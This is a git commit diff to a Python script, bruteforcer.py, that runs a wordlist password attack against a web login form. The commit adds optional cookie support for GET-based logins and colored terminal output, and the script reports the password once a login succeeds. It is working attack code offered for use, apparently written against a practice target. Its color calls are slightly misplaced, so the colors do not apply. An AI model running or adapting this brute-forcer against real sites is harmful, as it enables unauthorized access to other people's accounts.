26d469a731e13dd74bbae1ac24f09c2fb0765827
Tomas Bernatonis <tbernatonis8@gmail.com>
2023-08-21 11:04:21 -0400

    Adjusting the bruteforcer with further features such as cookies and colors

--- bruteforcer.py
+++ bruteforcer.py
@@ -1,27 +1,46 @@
 import requests
+from termcolor import colored
 
 url = input("[+] Enter the URL: ")
 username = input("[+] Enter the username for the acc to bruteforce: ")
 password_file = input("[+] Enter the path to the password file: ")
 login_failed_string = input("[+] Enter the login failed string: ")
+cookie_value = input("[+] Enter the cookie value(optional): ")
 
 
 def cracking(username, url):
     with open(password_file, "r") as passwords:
         for password in passwords:
             password = password.strip()
-            print(f"[+] Attempting to bruteforce {username} with password: {password}")
+            print(
+                colored(
+                    f"[+] Attempting to bruteforce {username} with password: {password}"
+                ),
+                "red",
+            )
             data = {
                 "username": username,
                 "password": password,
                 "Login": "submit",
             }
-            response = requests.post(url, data=data)
+            if cookie_value != "":
+                response = requests.get(
+                    url,
+                    params={
+                        "username": username,
+                        "password": password,
+                        "Login": "Login",
+                    },
+                    cookies={"Cookie": cookie_value},
+                )
+            else:
+                response = requests.post(url, data=data)
+
             if login_failed_string in response.content.decode():
                 pass
             else:
-                print(f"[+] username found: {username}")
-                print(f"[+] password found: {password}")
+                print(colored(f"[+] username found: {username}"), "green")
+                print(colored(f"[+] password found: {password}"), "green")
                 exit()
 
 
